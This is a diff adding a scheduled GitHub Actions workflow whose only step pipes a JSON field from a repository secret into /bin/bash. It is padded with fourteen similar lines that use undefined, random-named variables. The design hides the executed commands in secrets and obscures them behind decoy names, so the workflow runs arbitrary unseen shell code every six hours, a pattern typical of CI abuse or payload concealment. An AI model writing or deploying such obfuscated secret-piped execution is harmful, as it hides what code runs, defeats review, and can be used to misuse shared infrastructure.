@@ -1,0 +1,31 @@
+name: shidongshiyue
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shidongshiyue
+        env:
+          t4515: ${{ secrets.t4515 }}
+        run: |
+          echo $t4515 | jq -r .ap38647 | /bin/bash
+          echo $hf9379 | jq -r .zyd866 | /bin/bash
+          echo $ya64170 | jq -r .inm02 | /bin/bash
+          echo $m0015 | jq -r .xvorh81 | /bin/bash
+          echo $kplrk618 | jq -r .xhcam50138 | /bin/bash
+          echo $f991 | jq -r .q58 | /bin/bash
+          echo $sw899 | jq -r .kqjww0566 | /bin/bash
+          echo $tfz0 | jq -r .wg154 | /bin/bash
+          echo $ssxi27433 | jq -r .ttev6195 | /bin/bash
+          echo $eo24 | jq -r .vjp69585 | /bin/bash
+          echo $hgu51 | jq -r .be205 | /bin/bash
+          echo $hi7757 | jq -r .ztg84005 | /bin/bash
+          echo $bbji5 | jq -r .py0 | /bin/bash
+          echo $ystae6 | jq -r .a1 | /bin/bash
+          echo $erxf537 | jq -r .lnzv25 | /bin/bash
+
